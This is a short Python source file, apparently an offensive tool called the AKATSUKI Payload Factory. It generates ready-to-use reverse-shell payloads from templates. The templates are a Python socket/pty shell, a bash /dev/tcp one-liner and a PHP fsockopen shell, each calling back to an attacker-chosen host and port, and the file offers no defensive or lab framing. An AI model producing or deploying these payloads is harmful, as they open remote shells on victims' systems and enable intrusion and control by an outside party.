"""
AKATSUKI Payload Factory
"""
from datetime import datetime

class PayloadFactory:
    REVERSE_PYTHON = '''import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{LHOST}",{LPORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")'''
    REVERSE_BASH = 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
    REVERSE_PHP = '<?php $s=fsockopen("{LHOST}",{LPORT});$p=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);proc_close($p);?>'

    def __init__(self):
        self.payloads = {
            "reverse_python": (self._make(self.REVERSE_PYTHON), ".py"),
            "reverse_bash": (self._make(self.REVERSE_BASH), ".sh"),
            "reverse_php": (self._make(self.REVERSE_PHP), ".php"),
        }
    def _make(self, template):
        def gen(lhost, lport):
            code = template.format(LHOST=lhost, LPORT=lport)
            return f"# AKATSUKI\n# {datetime.now()}\n{code}"
        return gen
    def generate(self, ptype, lhost, lport):
        if ptype not in self.payloads: raise ValueError(f"Unknown: {ptype}")
        fn, ext = self.payloads[ptype]
        return fn(lhost, lport), ext


